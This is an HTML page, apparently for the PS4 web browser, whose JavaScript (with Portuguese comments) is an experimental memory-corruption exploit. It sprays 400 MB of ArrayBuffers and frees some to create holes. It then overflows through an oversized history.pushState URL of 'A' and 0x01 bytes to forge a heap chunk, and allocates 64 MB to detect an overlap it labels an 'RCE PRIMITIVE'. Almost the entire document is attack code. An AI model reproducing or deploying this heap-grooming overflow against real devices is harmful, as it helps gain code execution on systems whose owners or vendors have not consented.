<!DOCTYPE html>
<html>
<head>
    <title>PS4 GC Sniper (400MB / 64MB Alloc)</title>
    <style>
        body { background-color: #001a1a; color: #00ffff; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 25px; width: 100%; border: 2px solid #00ffff; background: #000; color: #fff; font-weight: bold; cursor: pointer;
            box-shadow: 0 0 20px #00ffff;
        }
        #log { margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111; text-align: left;}
        .win { background-color: #00ffff; color: #000; font-weight: bold; font-size: 1.2em; border: 2px solid white; padding: 10px;}
    </style>
</head>
<body>

    <h1>GC Sniper (400MB Trigger)</h1>
    <p>Atacando no momento exato da limpeza de memória.</p>

    <button onclick="startSniper()">INICIAR ATAQUE AOS 400MB</button>
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const ALIGNED_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 
        
        // O alvo agora é um Titã de 64MB
        const TITAN_SIZE = 64 * 1024 * 1024; 

        var filler = [];
        
        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startSniper() {
            log("1. Enchendo memória até o Gatilho do GC (400 MB)...");

            let count = 0;
            try {
                // Para exatamente em 400
                while(count < 400) { 
                    let ab = new ArrayBuffer(1024 * 1024 * 1); // 1MB
                    let view = new Uint8Array(ab);
                    view[0] = 0xAA; 
                    filler.push(ab);
                    count++;
                    
                    if(count % 20 === 0) {
                        log(`Alocados: ${count} MB...`);
                        await new Promise(r => setTimeout(r, 10)); 
                    }
                }
            } catch(e) {
                log(`Erro inesperado durante alocação: ${e.message}`);
            }

            log("2. Gatilho atingido. Preparando terreno...");
            
            // Cria alguns buracos recentes para o exploit entrar
            // Removemos os últimos 10 blocos alocados
            let total = filler.length;
            for(let i=0; i<10; i++) {
                if (filler[total - 1 - i]) filler[total - 1 - i] = null;
            }
            
            // Pequena pausa para o GC rodar naturalmente
            await new Promise(r => setTimeout(r, 500));

            log("3. Disparando Overflow (Criando Chunk Falso)...");

            setTimeout(() => {
                try {
                    let buffer = "A".repeat(ALIGNED_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "sniper", "/" + buffer);

                    // FASE 4: O PEDIDO GIGANTE
                    log("4. Solicitando Bloco de 64MB...");
                    checkBigAlloc();

                } catch (e) {
                    log("Erro no Exploit: " + e.message);
                }
            }, 500);
        }

        function checkBigAlloc() {
            try {
                // Tenta alocar 64MB
                let ghostBuffer = new ArrayBuffer(TITAN_SIZE);
                let ghostView = new Uint8Array(ghostBuffer);

                log("Alocação de 64MB realizada!");
                
                // VERIFICAÇÃO:
                // Se o buffer vier sujo com 0xAA (dos blocos de 1MB que soltamos)
                // ou com 0x01 (do nosso exploit), vencemos.
                
                let byte0 = ghostView[0];
                let byte1000 = ghostView[1000];
                
                if (byte0 === 0xAA || byte0 === 1) {
                    log("!!! JACKPOT - OVERLAP DETECTADO !!!", 'win');
                    log(`Byte encontrado: 0x${byte0.toString(16)}`, 'win');
                    alert("RCE PRIMITIVE: 64MB OVERLAP!");
                } else if (byte0 === 0) {
                    log("Resultado: Memória Limpa (0x00). O sistema achou um espaço vazio real.");
                } else {
                    log(`Resultado Curioso: Dados encontrados: 0x${byte0.toString(16)}`);
                }

            } catch(e) {
                log("Falha na alocação (OOM): " + e.message);
                log("O sistema não conseguiu achar 64MB contínuos.");
            }
        }
    </script>
</body>
</html>
